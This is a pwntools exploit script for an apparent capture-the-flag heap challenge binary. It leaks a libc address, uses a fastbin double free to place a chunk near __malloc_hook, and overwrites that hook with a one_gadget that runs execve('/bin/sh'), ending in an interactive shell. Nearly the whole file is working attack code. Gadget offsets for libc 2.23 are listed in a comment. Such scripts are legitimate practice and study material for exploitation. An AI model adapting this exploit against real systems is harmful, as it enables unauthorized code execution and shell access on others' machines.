#!/usr/bin/python3
from pwn import *
fname = "./challenge"
elf = ELF(fname, checksec=False)
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

if args.REMOTE:
    io = remote("ip", 0000)
    libc = ELF("./libc-2.23.so")
else:
    io = process([fname])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    cmd = \
    """
    b *0x{:x}
    """.format(0x400f02)
ru = lambda x : io.recvuntil(x)
se = lambda x : io.send(x)
rl = lambda x: io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(x)
sea = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a, b)
lg = lambda name,x: success(name+": 0x%x"%x)
"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
"""

def add(ctx):
	sla("\n> ", "1")
	sla(": ", ctx)

def setdes(ctx, sz, ctx_des):
	sla("\n> ", "2")
	sla(": ", ctx)
	if len(str(sz)) == 2:
		sla(": ", str(sz))
	else:
		sea(": ", str(sz))
	sla(": ", ctx_des)

def remove(ctx):
	sla("\n> ", "3")
	sla(": ", ctx)

def show():
	sla("\n> ", "4")	

for i in range(16):
	add(str(i))

setdes("0", 0x67, "A")
setdes("1", 0x67, "A")

setdes("15", 0xf7, "A")
setdes("14", 0x17, "A")
remove("15")
add("15")
show()
ru("15 - ")
libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - (0x7f552d99fb78 - 0x7f552d5db000)
setdes("13", 0xf7, "A")
# show()
remove("0")
add("0")
remove("1")
remove("0")
lg("libc", libc.address)
setdes("4", 0x67, p64(libc.sym['__malloc_hook']-0x23))
setdes("5", 0x67, "A")
setdes("6", 0x67, "A")
"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
setdes("8", 0x47, "A")
remove("8")
add("8")
# setdes("8", 0x47, "A")
setdes("7", 0x67, b"A"*0x13 + p64(libc.address+0xf0364))
# attach(io, cmd)

remove("8")
io.interactive()
